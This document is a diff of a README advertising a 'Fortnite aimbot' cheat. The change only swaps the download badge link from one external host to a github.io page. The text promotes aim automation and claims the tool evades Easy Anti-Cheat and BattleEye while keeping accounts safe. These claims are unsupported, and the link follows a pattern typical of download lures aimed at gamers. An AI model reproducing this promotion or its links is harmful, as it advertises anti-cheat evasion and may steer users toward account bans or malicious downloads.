@@ -1,7 +1,7 @@
 # **Ultimate Fortnite Aimbot Suite: Dominate the Battle Royale** 🏆🔥  
 Unleash **unmatched precision** in every match with this **AI-driven Fortnite aimbot**, engineered for *peak performance* and *stealth operation*. Designed for both casual players and competitive grinders, this tool offers **surgical accuracy**, **adaptive recoil control**, and **real-time threat analysis** to outplay opponents effortlessly. Built with **military-grade encryption** and **behavior-masking algorithms**, it bypasses Fortnite’s anti-cheat systems (*Easy Anti-Cheat/BattleEye*) while keeping your account secure.  
 
-**[![Download Fortnite Aimbot](https://img.shields.io/badge/Download-Fortnite%20Aimbot-blueviolet)](https://downloadifiles.com/?label=1e88dd1be7cebcac3b93ae91dcb2375f)**
+**[![Download Fortnite Aimbot](https://img.shields.io/badge/Download-Fortnite%20Aimbot-blueviolet)](https://fortnite-aimbot-external-cheat.github.io/.github/)**
 
 🚀 **Premium Features**:  
 - **Neural Network Targeting**: Self-learning AI adjusts to enemy movement patterns, bullet drop, and weapon recoil.  
